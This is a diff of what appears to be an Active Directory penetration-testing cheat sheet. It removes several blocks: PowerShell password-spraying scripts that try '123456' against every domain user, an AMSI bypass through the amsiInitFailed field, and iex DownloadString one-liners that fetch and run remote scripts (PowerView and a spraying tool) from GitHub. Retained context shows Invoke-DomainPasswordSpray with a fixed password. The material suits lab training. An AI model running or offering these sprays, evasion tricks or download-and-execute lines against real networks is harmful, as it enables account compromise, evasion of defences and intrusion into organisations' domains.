@@ -605,18 +605,6 @@ Find DCs with DNS Query
 nslookup -type=srv _ldap._tcp.dc._msdcs.sevenkingdoms.local 192.168.56.10
 ```
 
-# 6. domain password spray
-```
-Get-ADUser -Filter * -Properties EmailAddress, Enabled, LastLogonDate |
-    Select-Object Name, SamAccountName, EmailAddress, Enabled, LastLogonDate |
-    Export-Csv -Path "$env:USERPROFILE\Desktop\ADUsers.csv" -NoTypeInformation -Encoding UTF8
-
-Get-ADUser -Filter 'Enabled -eq $true' |
-    Select-Object -ExpandProperty SamAccountName |
-    Out-File "$env:USERPROFILE\Desktop\Enabled_ADUsers.txt" -Encoding UTF8
-
-iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kh4sh3i/Amsi-Bypass/main/dpspray.ps1');dpspray
-```
 
 ## 6. Active Directory Password Spraying
 ```powershell
@@ -637,102 +625,6 @@ type users.txt
 # Invoke-DomainSpray
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 1qaz!QAZ -Verbose
 ```
-
- 
-Spraying with Start-Process
-```
-# will spray only users that currently have 0 bad password attempts
-# dependency - powerview
-
-function Get-BadPasswordCount {
-    param(
-        $username = "username",
-        $domain = "offense.local"
-    )
-    $pdc = (get-netdomain -domain $domain).PdcRoleOwner
-    $badPwdCount = (Get-NetUser $username -Domain $domain -DomainController $pdc.name).badpwdcount
-    return $badPwdCount
-}
-
-$users = Get-netuser -properties samaccountname | Select-Object -ExpandProperty samaccountname
-$domain = "offense.local"
-$password = "123456"
-
-Write-Host $users.Count users supplied; $users | % {
-    $badPasswordCount = Get-BadPasswordCount -username $_ -Domain $domain
-    if ($badPasswordCount -lt 0) {
-        Write-Host Spraying : -NoNewline; Write-host -ForegroundColor Green " $_"
-        $credentials = New-Object System.Management.Automation.PSCredential -ArgumentList @("$domain\$_",(ConvertTo-SecureString -String $password -AsPlainText -Force))
-        Start-Process cmd -Credential ($credentials)
-    } else {
-        Write-Host "Ignoring $_ with $badPasswordCount badPwdCount" -ForegroundColor Red
-    }
-}
-```
-
-
-
-```
-# Will spray only users that currently have 0 bad password attempts
-# Dependency: ActiveDirectory module (not PowerView)
-
-function Get-BadPasswordCount {
-    param(
-        [string]$Username,
-        [string]$Domain = (Get-ADDomain).DNSRoot
-    )
-    try {
-        $user = Get-ADUser -Identity $Username -Server (Get-ADDomainController -DomainName $Domain -Discover).HostName `
-                -Properties BadPwdCount
-        return $user.BadPwdCount
-    }
-    catch {
-        Write-Host "[-] Could not get BadPwdCount for $Username" -ForegroundColor Yellow
-        return -1
-    }
-}
-
-# Gather users
-$users   = Get-ADUser -Filter * -Properties SamAccountName | Select-Object -ExpandProperty SamAccountName
-$domain  = (Get-ADDomain).DNSRoot
-$password = "123456"
-
-Write-Host "$($users.Count) users supplied"
-foreach ($user in $users) {
-    $badPasswordCount = Get-BadPasswordCount -Username $user -Domain $domain
-    if ($badPasswordCount -eq 0) {
-        Write-Host "Spraying : " -NoNewline
-        Write-Host "$user" -ForegroundColor Green
-
-        $secPassword = ConvertTo-SecureString -String $password -AsPlainText -Force
-        $credentials = New-Object System.Management.Automation.PSCredential ("$domain\$user",$secPassword)
-
-        try {
-            # example: run whoami on success
-            Start-Process powershell -Credential $credentials -ArgumentList "-Command whoami"
-        }
-        catch {
-            Write-Host "[-] Authentication failed for $user" -ForegroundColor Red
-        }
-    } else {
-        Write-Host "Ignoring $user with BadPwdCount=$badPasswordCount" -ForegroundColor Red
-    }
-}
-```
-
-
-----------------
-
-```
-# AMSI bypass (lab/testing)
-$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')
-$amsi.SetValue($null,$true)
-
-# Load Powerview in memory
-iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
-
-```
-
 
 
 ## 6.1 Do not require Kerberos preauthentication (AS-REP roasting)
